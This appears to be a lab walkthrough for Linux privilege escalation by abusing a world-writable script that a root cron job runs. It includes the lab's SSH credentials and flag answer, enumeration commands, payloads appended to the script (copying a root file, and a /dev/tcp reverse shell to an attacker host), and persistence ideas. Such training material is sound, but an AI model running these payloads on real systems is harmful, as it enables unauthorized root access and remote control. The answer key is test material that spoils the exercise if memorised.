# Section 13 — Cron Job Abuse

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/cron_abuse/flag.txt` via cron abuse | **`14347a2c977eb84508d3d50691a7ac4b`** |

Abused world-writable **`/dmz-backups/backup.sh`** (`-rwxrwxrwx`) run by a root cron every ~2 min.

---

## Concept

Cron entries (`min hr dom mon dow cmd`) often run as **root**. You don't need to read the crontab — if a **script that root's cron runs is writable by you** (or its directory, or it uses a relative path / wildcard / writable PATH), append your command and wait for the next tick.

---

## Find it

```bash
# crontabs (may not be readable, that's OK)
cat /etc/crontab; ls -la /etc/cron.* ; cat /etc/cron.d/* 2>/dev/null
crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs 2>/dev/null
# the real tell: writable files/dirs that look like backup/maintenance scripts
find / -path /proc -prune -o -type f -perm -o+w -name '*.sh' -print 2>/dev/null | grep -vE '^/sys'
# infer the schedule from output artifacts (timestamps on generated files):
ls -la --time-style=full-iso /dmz-backups/ | tail
# or watch jobs live WITHOUT root:
./pspy64 -pf -i 1000     # shows CRON / the script PID + exact command + cadence
```
> No readable crontab? **Infer cadence from generated file timestamps** (here backups ~2 min apart, newest had the current date → cron active). `pspy` (scans procfs, no root needed) shows the exact `/usr/sbin/CRON` → `/bin/sh -c /dmz-backups/backup.sh` chain and how often.

---

## Exploit

Confirm the script is writable and runs as root:
```bash
ls -la /dmz-backups/backup.sh        # -rwxrwxrwx ... root  -> world-writable, root-owned
cat /dmz-backups/backup.sh           # understand it; preserve its real function
cp /dmz-backups/backup.sh /tmp/backup.sh.orig    # ALWAYS back up before editing
```
Append payload **after** the script's normal commands so the legit job still works:
```bash
# headless / scriptable (exfil the root file to a readable path):
printf '\ncp /root/cron_abuse/flag.txt /tmp/cf 2>/dev/null; chmod 666 /tmp/cf\n' >> /dmz-backups/backup.sh
# OR interactive root (reverse shell):
printf '\nbash -i >& /dev/tcp/<LH>/443 0>&1\n' >> /dmz-backups/backup.sh   # + nc -lnvp 443
# OR persistent root: add sudoers line / SUID bash / SSH key to /root
```
Wait one cron interval, then collect:
```bash
for i in $(seq 1 20); do [ -f /tmp/cf ] && break; sleep 12; done
cat /tmp/cf            # -> 14347a2c977eb84508d3d50691a7ac4b
ls -t /dmz-backups/*.tgz | head -1   # newest tgz timestamp confirms the cron fired
```
> **Headless > reverse shell here:** a `cp flag -> /tmp` + `chmod 666` payload returns the answer with no listener/interactivity (same philosophy as the Screen/Nagios PoCs). Reverse shell only when you need a full root session.

**Cleanup (real-engagement critical):**
```bash
cp /tmp/backup.sh.orig /dmz-backups/backup.sh; rm -f /tmp/cf /tmp/backup.sh.orig
```
> Restore the original script — leaving an attacker command in a **root cron** is a persistent backdoor and breaks the legit job. (On this run the HTB box reset/expired before cleanup completed; ephemeral lab → moot, but on a real target this step is mandatory and you keep the `.orig` for exactly this.)

---

## Other cron vectors

| Misconfig | Abuse |
|-----------|-------|
| Writable script run by root cron | append command (this box) |
| Writable **dir** containing the script | replace the script |
| Cron uses relative cmd name + writable PATH | PATH abuse (§5) |
| Cron `tar/rsync ... *` in writable dir | wildcard injection (§6) |
| Writable `/etc/cron.d/*` / `/etc/cron.*/` file | add your own root entry |
| `*/3 * * * *` typo (meant `0 */3`) | runs every 3 *min* — fast feedback |

---

## Exam / Engagement Notes

- **`find / -perm -o+w -name '*.sh'` + `pspy`** is the combo: find the writable script, confirm root runs it & how often.
- Can't read the crontab? Timestamps of generated files = the schedule.
- Append (don't replace) after the real commands; **always `cp` a `.orig` first** and restore it.
- Prefer a headless exfil payload for "submit the flag"; reverse shell for interactive root.
- Cron abuse needs patience — wait a full interval; `pspy` tells you how long.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. find / -perm -o+w -name '*.sh' 2>/dev/null  -> /dmz-backups/backup.sh (-rwxrwxrwx, root)
   ls -la /dmz-backups (newest .tgz current date, ~2 min apart -> active root cron)
3. cp backup.sh /tmp/backup.sh.orig
   printf '\ncp /root/cron_abuse/flag.txt /tmp/cf; chmod 666 /tmp/cf\n' >> /dmz-backups/backup.sh
4. wait ~2 min ; cat /tmp/cf  -> 14347a2c977eb84508d3d50691a7ac4b   ✅
5. restore: cp /tmp/backup.sh.orig /dmz-backups/backup.sh ; rm /tmp/cf
```

> One line: writable script + root cron = append your command, wait one tick, collect — then restore the script.
